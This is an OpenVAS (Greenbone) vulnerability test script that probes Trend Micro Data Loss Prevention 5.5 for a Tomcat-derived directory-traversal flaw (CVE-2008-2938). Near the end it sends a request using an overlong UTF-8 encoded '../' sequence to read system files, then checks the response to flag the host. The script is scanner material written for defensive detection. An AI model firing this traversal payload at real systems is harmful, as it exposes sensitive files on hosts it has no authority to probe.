###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_trend_micro_data_loss_prevention_48225.nasl 12023 2018-10-23 05:37:04Z cfischer $
#
# Trend Micro Data Loss Prevention Directory Traversal Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:trend_micro:data_loss_prevention";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103182");
  script_version("$Revision: 12023 $");
  script_cve_id("CVE-2008-2938"); # nb: The bug on the product is caused by an vuln in Apache Tomcat, thus the related Tomcat CVE here.
  script_tag(name:"last_modification", value:"$Date: 2018-10-23 07:37:04 +0200 (Tue, 23 Oct 2018) $");
  script_tag(name:"creation_date", value:"2011-06-14 13:57:36 +0200 (Tue, 14 Jun 2011)");
  script_bugtraq_id(48225);
  script_name("Trend Micro Data Loss Prevention Directory Traversal Vulnerability");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:N/A:N");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
  script_dependencies("gb_trend_micro_data_loss_prevention_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 8443);
  script_mandatory_keys("trendmicro/datalossprevention/detected");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/48225");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/17388/");
  script_xref(name:"URL", value:"http://us.trendmicro.com/us/products/enterprise/data-loss-prevention/index.html");

  script_tag(name:"summary", value:"Trend Micro Data Loss Prevention is prone to a directory-traversal
  vulnerability because it fails to sufficiently sanitize user-supplied input.");

  script_tag(name:"impact", value:"A remote attacker could exploit this vulnerability using directory-
  traversal strings (such as '../') to gain access to arbitrary files on the targeted system. This may
  result in the disclosure of sensitive information or lead to a complete compromise of the affected computer.");

  script_tag(name:"affected", value:"Trend Micro Data Loss Prevention 5.5 is vulnerable. Other versions may
  also be affected.");

  script_tag(name:"insight", value:"Trend Micro Data Loss Prevention is shipping a vulnerable Apache Tomcat
  version affected by a directory-traversal vulnerability registered with the CVE-2008-2938.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective features,
  remove the product or replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("misc_func.inc");

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! dir  = get_app_location( cpe:CPE, port:port, service:"www" ) ) exit( 0 );
if( dir == "/" ) dir = "";

files = traversal_files();

foreach pattern( keys( files ) ) {

  file = files[pattern];

  url = string( dir, "//%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/" + file );

  if( http_vuln_check( port:port, url:url, pattern:pattern ) ) {
    report = report_vuln_url( url:url, port:port );
    security_message(port:port, data:url );
  }
}

exit( 0 );